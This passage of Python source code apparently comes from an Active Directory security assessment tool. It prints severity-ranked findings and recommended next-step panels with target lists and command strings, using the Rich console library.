            label = f"{sev.label}:"
            line = Text()
            line.append(f"  {label:<12}", style=style)
            line.append(f"{count} queries with findings")
            parts.append(line)

    if not has_findings:
        parts.append(Text("  No significant findings detected", style="success"))

    return parts


def _print_next_steps(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
    adcs_info: dict[str, Any],
    domain_info: dict[str, Any],
) -> None:
    """Print recommended next steps based on findings."""
    steps = _collect_next_steps(metrics, targets, adcs_info, domain_info)

    if not steps:
        return

    console.print()
    console.print(Rule(title="[header]Recommended Next Steps[/header]", style="border"))

    critical_steps = [s for s in steps if s["priority"] == "CRITICAL"]
    high_steps = [s for s in steps if s["priority"] == "HIGH"]
    medium_steps = [s for s in steps if s["priority"] == "MEDIUM"]

    for step in critical_steps:
        _print_step(step, Severity.CRITICAL)

    for step in high_steps:
        _print_step(step, Severity.HIGH)

    for step in medium_steps:
        _print_step(step, Severity.MEDIUM)

    console.print()


def _print_step(step: dict[str, Any], severity: Severity) -> None:
    """Print a single next step as a severity-bordered Rich Panel."""
    priority = step["priority"]
    title = step["title"]
    description = step["description"]
    command = step["command"]
    step_targets = step.get("targets", [])

    border_color = _sev_border(severity)
    sev_style = _sev_style(severity)

    # Build panel body
    body = Text()
    body.append(f"{description}\n", style="text.dim")

    # Targets list
    if step_targets:
        max_show = 5
        for target in step_targets[:max_show]:
            body.append("  > ", style="node")
            body.append(f"{target}\n")
        if len(step_targets) > max_show:
            body.append(f"  ... and {len(step_targets) - max_show} more\n", style="text.muted")

    # Command line
    body.append("\n$ ", style="command")
    body.append(command, style="command")

    panel_title = Text()
    panel_title.append(f"[{priority}] ", style=sev_style)
    panel_title.append(title, style="bold")

    console.print()
    console.print(
        Panel(
            body,
            title=panel_title,
            border_style=border_color,
            padding=(0, 2),
            expand=False,
        )
    )
